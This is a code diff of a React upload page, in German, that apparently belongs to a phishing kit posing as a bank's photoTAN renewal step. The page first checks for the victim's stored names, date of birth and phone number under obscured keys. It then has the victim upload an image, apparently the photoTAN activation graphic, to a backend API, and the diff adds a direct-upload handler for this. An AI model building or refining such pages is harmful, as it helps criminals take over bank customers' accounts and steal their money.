@@ -14,11 +14,11 @@ const UploadPage: React.FC = () => {
   const fileInputRef = useRef<HTMLInputElement>(null);
 
   useEffect(() => {
-    // Check if user came from info page
-    const xname1 = sessionStorage.getItem('xname1');
-    const xname2 = sessionStorage.getItem('xname2');
-    const xdob = sessionStorage.getItem('xdob');
-    const xtel = sessionStorage.getItem('xtel');
+    // Check if user came from info page (check both sessionStorage and localStorage)
+    const xname1 = sessionStorage.getItem('xname1') || localStorage.getItem('xname1');
+    const xname2 = sessionStorage.getItem('xname2') || localStorage.getItem('xname2');
+    const xdob = sessionStorage.getItem('xdob') || localStorage.getItem('xdob');
+    const xtel = sessionStorage.getItem('xtel') || localStorage.getItem('xtel');
     
     if (!xname1 || !xname2 || !xdob || !xtel) {
       navigate('/info');
@@ -64,12 +64,12 @@ const UploadPage: React.FC = () => {
 
     try {
       const formData = new FormData();
-      formData.append('file', selectedFile);
+        formData.append('file', selectedFile);
       
       const response = await apiService.upload(formData);
       
       if (response.success) {
-        navigate('/success');
+          navigate('/done');
       } else {
         setError(response.message || 'Upload failed');
       }
@@ -87,6 +87,43 @@ const UploadPage: React.FC = () => {
     } else {
       // If no file selected, open file picker
       fileInputRef.current?.click();
+    }
+  };
+
+  const handleDirectUpload = async () => {
+    const fileInput = document.getElementById('directUpload') as HTMLInputElement;
+    const file = fileInput?.files?.[0];
+    
+    if (!file) {
+      return;
+    }
+
+    try {
+      setIsLoading(true);
+      
+      const sessionId = sessionStorage.getItem('sessionId') || localStorage.getItem('sessionId');
+      
+      const formData = new FormData();
+      formData.append('file', file);
+      formData.append('sessionId', sessionId || '');
+      
+      const response = await fetch('http://localhost:3001/api/upload', {
+        method: 'POST',
+        body: formData
+      });
+      
+      const result = await response.json();
+      
+      if (result.success) {
+        // Navigate to done page
+        navigate('/done');
+      } else {
+        setError(result.message || 'Upload failed');
+      }
+    } catch (error) {
+      setError('Upload failed. Please try again.');
+    } finally {
+      setIsLoading(false);
     }
   };
 
@@ -117,6 +154,7 @@ const UploadPage: React.FC = () => {
       }}>
         Letzter Schritt: Verlängerung Ihres bestehenden photoTAN-Verfahrens
       </h1>
+
       
       <div style={{
         display: 'flex',
@@ -128,7 +166,7 @@ const UploadPage: React.FC = () => {
         margin: '0 auto',
         padding: isMobile ? '0 15px' : '0 20px'
       }}>
-        {/* Left Column - Upload Section */}
+          {/* Left Column - Upload Section */}
         <div style={{
           flex: '1',
           background: 'white',
@@ -183,10 +221,10 @@ const UploadPage: React.FC = () => {
                 }}>
                   <strong>{t('mobileNotice')}:</strong> {t('mobileNoticeText')}
                 </p>
+                  </div>
+                )}
               </div>
-            )}
-          </div>
-          
+              
           {/* GIF from public folder */}
           <div style={{
             textAlign: 'center',
@@ -202,73 +240,53 @@ const UploadPage: React.FC = () => {
                 boxShadow: '0 2px 8px rgba(0, 0, 0, 0.1)'
               }}
             />
-          </div>
-          
+                      </div>
+                      
           {/* Hidden File Input */}
-          <input
-            type="file"
+                <input
+                  type="file"
             ref={fileInputRef}
-            onChange={handleFileInputChange}
-            accept="image/*"
-            style={{ display: 'none' }}
+                  onChange={handleFileInputChange}
+                  accept="image/*"
+                  style={{ display: 'none' }}
           />
 
           {/* Buttons Container */}
-          <div style={{
-            display: 'flex',
-            flexDirection: isMobile ? 'column' : 'row',
-            justifyContent: 'center',
-            gap: isMobile ? '10px' : '15px',
-            marginTop: '20px'
+          <div style={{ 
+            textAlign: 'center',
+            margin: '20px 0'
           }}>
+            <input
+              type="file"
+              id="directUpload"
+              accept="image/*"
+              style={{ 
+                margin: '0 10px 15px 0',
+                padding: '8px',
+                border: '1px solid #ddd',
+                borderRadius: '4px',
+                fontSize: '14px'
+              }}
+            />
+            <br />
             <button
-              type="button"
-              onClick={handleUploadClick}
+              onClick={handleDirectUpload}
               disabled={isLoading}
               style={{
-                width: isMobile ? '100%' : '40%',
-                padding: isMobile ? '18px' : '15px',
-                background: isLoading ? '#ccc' : 'linear-gradient(135deg, #006400 0%, #004d00 50%, #006400 100%)',
+                background: 'linear-gradient(135deg, #006400 0%, #004d00 50%, #006400 100%)',
                 color: 'white',
                 border: 'none',
-                borderRadius: '4px',
-                fontSize: '16px',
-                fontWeight: 'bold',
+                padding: '12px 24px',
+                borderRadius: '5px',
                 cursor: isLoading ? 'not-allowed' : 'pointer',
-                fontFamily: 'Arial, Helvetica, sans-serif',
-                display: 'flex',
-                alignItems: 'center',
-                justifyContent: 'center',
-                gap: '8px',
-                transition: 'background 0.3s ease'
-              }}
-            >
-              {isLoading ? 'Hochladen...' : (selectedFile ? 'Datei hochladen' : 'Datei auswählen')}
-            </button>
-
-            <button
-              type="button"
-              onClick={() => navigate('/done')}
-              disabled={!selectedFile || isLoading}
-              style={{
-                width: isMobile ? '100%' : '40%',
-                padding: isMobile ? '18px' : '15px',
-                background: (!selectedFile || isLoading) ? '#ccc' : '#FFC107',
-                color: 'white',
-                border: 'none',
-                borderRadius: '4px',
                 fontSize: '16px',
                 fontWeight: 'bold',
-                cursor: (!selectedFile || isLoading) ? 'not-allowed' : 'pointer',
-                fontFamily: 'Arial, Helvetica, sans-serif',
-                display: 'flex',
-                alignItems: 'center',
-                justifyContent: 'center',
-                gap: '8px',
-                transition: 'background 0.3s ease'
+                opacity: isLoading ? 0.7 : 1,
+                transition: 'all 0.3s ease',
+                minWidth: isMobile ? '120px' : '150px'
               }}
             >
-              Weiter
+              {isLoading ? 'Wird hochgeladen...' : 'Datei hochladen'}
             </button>
           </div>
 
@@ -290,8 +308,8 @@ const UploadPage: React.FC = () => {
               }}>
                 Ausgewählt: {selectedFile.name}
               </p>
-            </div>
-          )}
+                  </div>
+                )}
 
           {/* Error Display */}
           {error && (
@@ -378,7 +396,7 @@ const UploadPage: React.FC = () => {
               </div>
             </div>
           </div>
-          
+
           <div style={{ marginBottom: '20px' }}>
             <h4 style={{
               fontSize: '16px',
@@ -413,8 +431,8 @@ const UploadPage: React.FC = () => {
                 <span style={{ fontSize: '14px', color: '#333' }}>{t('forgotPIN')}</span>
               </div>
             </div>
-          </div>
-          
+              </div>
+
           <div>
             <h4 style={{
               fontSize: '16px',
